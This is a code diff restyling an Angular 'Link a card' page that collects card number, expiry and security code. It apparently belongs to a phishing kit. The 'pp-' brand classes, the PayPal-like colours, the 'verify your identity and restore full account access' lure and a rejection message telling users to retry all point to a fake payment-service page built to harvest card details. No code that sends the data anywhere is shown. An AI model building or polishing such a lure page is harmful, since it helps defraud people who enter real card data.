@@ -13,28 +13,28 @@ import { validateCardLogic, CardType } from './card-validation.utils';
   template: `
     <app-public-layout>
       
-      <div class="flex flex-col items-center mb-8">
-        <h1 class="text-2xl font-bold text-[#2c2e2f] mb-3 text-center tracking-tight">Link a card</h1>
-        <p class="text-[15px] text-[#5e6c75] text-center leading-relaxed max-w-[90%]">
+      <div class="flex flex-col items-center mb-6">
+        <h1 class="text-2xl font-bold text-pp-navy mb-2 text-center tracking-tight">Link a card</h1>
+        <p class="text-base text-slate-500 text-center leading-relaxed max-w-[90%]">
            Link a debit or credit card to verify your identity and restore full account access.
         </p>
       </div>
 
       @if (state.rejectionReason()) {
-        <div class="mb-6 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 rounded-r-md animate-in fade-in slide-in-from-top-2">
-            <span class="material-icons text-[#d92d20] text-xl mt-0.5">credit_card_off</span>
+        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
+            <span class="material-icons text-[#D92D20] text-xl">credit_card_off</span>
             <div>
-              <p class="text-sm font-bold text-[#2c2e2f]">Check card details</p>
-              <p class="text-xs text-[#5e6c75]">We couldn't confirm this card. Please try again.</p>
+              <p class="text-sm font-bold text-pp-navy">Check card details</p>
+              <p class="text-xs text-slate-600 mt-1">We couldn't confirm this card. Please try again.</p>
             </div>
         </div>
       }
 
-      <div class="space-y-5">
+      <div class="space-y-6">
         
         <div class="space-y-4">
            <!-- Card Number -->
-          <div class="relative group">
+          <div class="pp-input-group">
             <input 
                  type="text" 
                  [value]="cardNumberDisplay"
@@ -43,31 +43,28 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                  id="cardNum"
                  placeholder=" "
                  maxlength="19"
-                 class="peer w-full h-[56px] pl-12 pr-10 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus font-mono tracking-wide"
+                 class="pp-input peer font-mono tracking-wide"
                  [class.shadow-input-error]="touchedCard() && !isCardNumValid()"
                >
-               <label 
-                 for="cardNum" 
-                 class="absolute left-12 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-                 >
-                 Card number
-              </label>
-               <span class="material-icons absolute left-4 top-4 text-slate-400 text-2xl peer-focus:text-brand-500 transition-colors">payment</span>
+               <label for="cardNum" class="pp-label">Card number</label>
                
                <!-- Dynamic Brand Icon -->
                @if(cardType() !== 'unknown') {
-                   <div class="absolute right-3 top-3.5 h-7 w-10 bg-white shadow-sm border rounded flex items-center justify-center">
+                   <div class="absolute right-4 top-4 h-7 w-10 bg-white shadow-sm border rounded flex items-center justify-center animate-fade-in">
                         <img *ngIf="cardType() === 'visa'" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3 object-contain">
                         <img *ngIf="cardType() === 'mastercard'" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-4 object-contain">
                         <img *ngIf="cardType() === 'amex'" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="h-3 object-contain">
                         <img *ngIf="cardType() === 'discover'" src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" class="h-5 object-contain">
                    </div>
                }
+               @else {
+                   <span class="material-icons absolute right-4 top-4 text-slate-300 text-2xl">credit_card</span>
+               }
           </div>
 
            <!-- Exp / CVV Row -->
           <div class="flex gap-4">
-             <div class="relative w-1/2 group">
+             <div class="relative w-1/2 pp-input-group mb-0">
                 <input 
                   type="text" 
                   [value]="expiry"
@@ -76,18 +73,13 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                   id="expiry"
                   placeholder=" "
                   maxlength="5"
-                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus font-mono"
+                  class="pp-input peer font-mono"
                   [class.shadow-input-error]="touchedExp() && !isExpiryValid()"
                 >
-                <label 
-                   for="expiry" 
-                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-                   >
-                   MM / YY
-                </label>
+                <label for="expiry" class="pp-label">MM / YY</label>
              </div>
              
-             <div class="relative w-1/2 group">
+             <div class="relative w-1/2 pp-input-group mb-0">
                 <input 
                     type="password" 
                     [(ngModel)]="cvv"
@@ -96,17 +88,12 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                     id="cvv"
                     placeholder=" "
                     [maxlength]="cvvMaxLength()"
-                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus font-mono"
+                    class="pp-input peer font-mono"
                     [class.shadow-input-error]="touchedCvv() && !isCvvValid()"
                   >
-                  <label 
-                   for="cvv" 
-                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-                   >
-                   Security Code
-                  </label>
+                  <label for="cvv" class="pp-label">Security Code</label>
                   
-                  <div class="absolute right-3 top-4 text-slate-400">
+                  <div class="absolute right-3 top-4 text-slate-400 group relative cursor-help">
                       <span class="material-icons text-[20px]">help_outline</span>
                   </div>
              </div>
@@ -118,16 +105,15 @@ import { validateCardLogic, CardType } from './card-validation.utils';
             (click)="submit()"
             [disabled]="!isValid()"
             [class.opacity-50]="!isValid()"
-            [class.hover:bg-brand-900]="isValid()"
-            class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
+            class="pp-btn"
           >
             Link Card
           </button>
         </div>
         
-        <div class="flex justify-center items-center gap-2 mt-4">
-             <span class="material-icons text-[14px] text-slate-400">lock</span>
-             <p class="text-xs text-slate-500 font-medium">Your card information is stored securely.</p>
+        <div class="flex justify-center items-center gap-2 mt-4 opacity-60">
+             <span class="material-icons text-[14px] text-pp-success">lock</span>
+             <p class="text-xs text-slate-500 font-bold">Your card information is stored securely.</p>
         </div>
       </div>
     </app-public-layout>
